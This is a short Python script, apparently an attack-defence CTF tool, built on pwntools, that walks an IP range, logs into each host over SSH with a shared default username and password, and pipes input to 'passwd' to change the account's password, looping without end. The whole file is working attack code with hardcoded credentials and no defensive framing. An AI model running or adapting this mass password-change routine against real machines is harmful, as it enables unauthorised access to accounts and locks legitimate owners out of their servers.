# -*- coding:utf-8 -*-
# from multiprocessing import Pool
from pwn import *
from IPLIST import *
class FUCKPASSWD:
    """docstring for FUCKPASSWD
    attack=FUCKPASSWD("172.192.168.14-18-2",timeout=2)
    attack.exploit()
    """
    def __init__(self, ip="192.168.111.14-18-2", port=22,user='wongyohoo', passwd="cz19990403", mypasswd='qazxswedc',timeout=None):
        if timeout:
            context(log_level='debug',timeout=timeout)
        # 如果知道其他的username和passwd, 批量修改!

        # ------------------ config ---------------------
        self.PORT=port
        self.USER=user
        self.PASSWD=passwd
        self.IP_RANGE=ip
        self.MY_PASSWD=mypasswd
        # ------------------ config ---------------------

    def fuck(self,ip):
        command=r"echo -e '"+self.PASSWD+r"\n"+self.MY_PASSWD+r"\n"+self.MY_PASSWD+r"""\n' | passwd """+self.USER+"\n"
        while True:
            r=None
            try:
                r = ssh(host=ip,port=self.PORT, user=self.USER, password=self.PASSWD,level=0)
                r.run(command)
                success("SUCCESS: "+ip)
            except Exception as e:
                info("Error: "+ip)
                break
                # continue
            finally:
                if r:
                    r.close()

    def exploit(self):
        ip_pool=IPLIST(self.IP_RANGE).result
        print(ip_pool)
        while True:
            for i in ip_pool:
                try:
                    self.fuck(i)
                except Exception:
                    continue

        # ps=Pool(20)
        # for i in ip_pool:
        #     ps.apply_async(fuck,args=(i,))
        # ps.close()
        # ps.join()